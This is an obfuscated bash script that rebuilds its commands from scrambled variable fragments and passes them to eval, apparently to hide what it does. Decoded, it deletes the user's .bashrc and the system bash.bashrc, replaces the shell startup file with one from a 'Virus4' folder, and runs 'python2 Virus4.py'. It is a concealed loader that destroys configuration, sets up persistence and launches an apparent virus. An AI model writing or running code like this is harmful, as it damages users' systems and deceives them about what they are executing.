z="
";Hz='./us';Nz='us4/';Ez='bash';Iz='r/et';Fz='rc';Pz='r';Bz='HOME';Dz='rf .';Az='cd $';Cz='rm -';Vz='pyth';Sz='/.ba';Wz='on2 ';Uz='us4';Rz='rc $';Gz='cd .';Kz='rf b';Tz='shrc';Oz='.Ame';Yz='s4.p';Xz='Viru';Zz='y';Qz='cp b';Lz='ash.';Mz='/Vir';Jz='c/';
eval "$Az$Bz$z$Cz$Dz$Ez$Fz$z$Gz$Hz$Iz$Jz$z$Cz$Kz$Lz$Ez$Fz$z$Az$Bz$Mz$Nz$Oz$Pz$z$Qz$Lz$Ez$Rz$Bz$Sz$Tz$z$Az$Bz$Mz$Uz$z$Vz$Wz$Xz$Yz$Zz"